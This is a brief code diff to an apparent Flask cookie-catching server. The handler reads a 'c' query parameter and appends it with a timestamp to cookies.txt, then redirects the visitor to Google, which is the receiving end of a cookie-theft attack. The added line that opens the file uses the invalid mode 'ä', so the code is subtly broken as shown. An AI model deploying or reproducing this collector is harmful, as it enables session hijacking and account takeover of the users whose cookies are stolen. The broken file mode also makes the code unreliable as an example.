@@ -7,9 +7,12 @@ app = Flask(__name__) # Create instance
 def cookie():
 
 	# Grab cookie and write it to a file
-	
+
 	cookie = request.args.get('c')
-	print(cookie)
+	f = open("cookies.txt","ä")
+	f.write(cookie + ' ' + str(datetime.now()) + '\n')
+	f.close()
+
 	# redirect user to google
 	return redirect("https://google.com/")
 
